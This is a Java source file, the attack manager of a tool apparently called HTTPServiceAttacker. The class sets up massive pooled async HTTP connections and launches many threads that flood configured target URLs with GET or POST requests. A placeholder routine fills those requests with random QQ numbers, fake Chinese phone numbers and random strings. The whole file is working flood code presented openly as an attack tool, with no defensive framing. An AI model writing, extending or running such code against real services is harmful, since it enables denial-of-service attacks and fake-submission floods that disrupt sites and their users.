package com.ishland.app.HTTPServiceAttacker.attacker;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Map;

import org.apache.commons.lang3.RandomStringUtils;
import org.apache.http.HeaderElement;
import org.apache.http.HeaderElementIterator;
import org.apache.http.HttpResponse;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.conn.ConnectionKeepAliveStrategy;
import org.apache.http.impl.DefaultConnectionReuseStrategy;
import org.apache.http.impl.nio.client.CloseableHttpAsyncClient;
import org.apache.http.impl.nio.client.HttpAsyncClients;
import org.apache.http.impl.nio.conn.PoolingNHttpClientConnectionManager;
import org.apache.http.impl.nio.reactor.DefaultConnectingIOReactor;
import org.apache.http.message.BasicHeaderElementIterator;
import org.apache.http.nio.reactor.ConnectingIOReactor;
import org.apache.http.nio.reactor.IOReactorException;
import org.apache.http.protocol.HTTP;
import org.apache.http.protocol.HttpContext;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.ishland.app.HTTPServiceAttacker.attacker.threads.AttackerThread;
import com.ishland.app.HTTPServiceAttacker.attacker.threads.MonitorThread;
import com.ishland.app.HTTPServiceAttacker.configuration.Configuration;

public class Attack {

    private static Configuration config = null;
    public static ArrayList<AttackerThread> thrs = new ArrayList<>();
    private static MonitorThread monitorThread = null;
    private static final Logger logger = LoggerFactory.getLogger("Attack manager");
    private static ConnectingIOReactor ioReactor = null;
    private static PoolingNHttpClientConnectionManager cm = null;
    public static CloseableHttpAsyncClient httpClient = null;

    public static void initClient(int threads) {
	try {
	    ioReactor = new DefaultConnectingIOReactor();
	} catch (IOReactorException e) {
	    logger.error("Unable to start IOReactor", e);
	    System.exit(1);
	    return;
	}
	cm = new PoolingNHttpClientConnectionManager(ioReactor);
	cm.setMaxTotal(threads * 4096);
	cm.setDefaultMaxPerRoute(threads * 4096);
	RequestConfig defaultRequestConfig = RequestConfig.custom().setConnectTimeout(30000).setSocketTimeout(30000)
		.setConnectionRequestTimeout(30000).build();

	ConnectionKeepAliveStrategy myStrategy = new ConnectionKeepAliveStrategy() {
	    @Override
	    public long getKeepAliveDuration(HttpResponse response, HttpContext context) {
		HeaderElementIterator it = new BasicHeaderElementIterator(
			response.headerIterator(HTTP.CONN_KEEP_ALIVE));
		while (it.hasNext()) {
		    HeaderElement he = it.nextElement();
		    String param = he.getName();
		    String value = he.getValue();
		    if (value != null && param.equalsIgnoreCase("timeout")) {
			return Long.parseLong(value) * 1000;
		    }
		}
		return 60 * 1000;// 如果没有约定，则默认定义时长�?60s
	    }
	};
	httpClient = HttpAsyncClients.custom().setConnectionReuseStrategy(new DefaultConnectionReuseStrategy())
		.setKeepAliveStrategy(myStrategy).setDefaultRequestConfig(defaultRequestConfig).setConnectionManager(cm)
		.build();
	httpClient.start();
    }

    public static void startAttack() throws IllegalAccessException {
	logger.info("Starting attack...");
	if (getConfig() == null)
	    throw new IllegalAccessException("Configuration is not set!");
	monitorThread = new MonitorThread();
	monitorThread.start();
	int totalthreads = 0;
	for (int i = 0; i < getConfig().getTarget().size(); i++)
	    totalthreads += Integer.valueOf(String.valueOf(getConfig().getTarget().get(i).get("threads"))).intValue();
	Attack.initClient(totalthreads);
	Iterator<Map<String, Object>> itall = getConfig().getTarget().iterator();
	while (itall.hasNext()) {
	    Map<String, Object> itallmap = itall.next();
	    for (long i = 0; i < Long.valueOf(String.valueOf(itallmap.get("threads"))).longValue(); i++) {
		AttackerThread thr = new AttackerThread();
		if (itallmap.get("mode") == "POST")
		    thr.setMethod(AttackerThread.POST);
		else
		    thr.setMethod(AttackerThread.GET);
		thr.setTarget(String.valueOf(itallmap.get("addr")));
		thr.setData(String.valueOf(itallmap.get("data")));
		thr.setShowExceptions(getConfig().isShowExceptions());
		thr.setReferer(String.valueOf(itallmap.get("referer")));
		thr.start();
		thrs.add(thr);
		thr = null;
	    }
	    itallmap = null;
	}
	itall = null;
	logger.info("Attack started.");
    }

    public static void stopAttack() {
	logger.info("Sending stop signal to all attacker threads...");
	Iterator<AttackerThread> it = thrs.iterator();
	while (it.hasNext())
	    it.next().stopTask();
	it = null;
	logger.info("Waiting for all the threads to die...");
	it = thrs.iterator();
	while (it.hasNext()) {
	    AttackerThread thr = it.next();
	    try {
		thr.join();
	    } catch (InterruptedException e) {
		logger.warn("Could not wait for " + thr.getName() + " to die", e);
	    }
	    thr = null;
	}
	it = null;
	if (ioReactor != null)
	    try {
		ioReactor.shutdown();
	    } catch (IOException e2) {
	    }
	ioReactor = null;
	if (httpClient != null)
	    try {
		httpClient.close();
	    } catch (IOException e1) {
	    }
	httpClient = null;
	if (cm != null)
	    try {
		cm.shutdown();
	    } catch (IOException e1) {
	    }
	cm = null;
	if (monitorThread != null) {
	    monitorThread.stopTask();
	    try {
		monitorThread.join();
	    } catch (InterruptedException e) {
		logger.warn("Could not wait for Monitor Thread to die", e);
	    }
	}
	try {
	    Thread.sleep(100);
	} catch (InterruptedException e) {
	}
	MonitorThread.logging.run();
	monitorThread = null;
	logger.info("Attack stopped.");
    }

    public static String replacePlaceHolders(String origin) {
	String result = new String(origin);
	result = result.replaceAll("\\[QQ\\]", RandomStringUtils.randomNumeric(5, 10));
	result = result.replaceAll("\\[86Phone\\]", "1" + RandomStringUtils.randomNumeric(10));
	result = result.replaceAll("\\[time_sec\\]", String.valueOf((long) System.currentTimeMillis() / 1000));
	for (int i = 1; i <= 32; i++) {
	    result = result.replaceAll("\\[Ascii_" + String.valueOf(i) + "\\]", RandomStringUtils.randomAscii(i));
	    result = result.replaceAll("\\[Number_" + String.valueOf(i) + "\\]", RandomStringUtils.randomNumeric(i));
	    result = result.replaceAll("\\[Alpha_" + String.valueOf(i) + "\\]", RandomStringUtils.randomAlphabetic(i));
	    result = result.replaceAll("\\[NumAlp_" + String.valueOf(i) + "\\]",
		    RandomStringUtils.randomAlphanumeric(i));
	}
	return result;
    }

    /**
     * @return the config
     */
    public static Configuration getConfig() {
	return config;
    }

    /**
     * @param config the config to set
     */
    public static void setConfig(Configuration config) {
	Attack.config = config;
    }

}
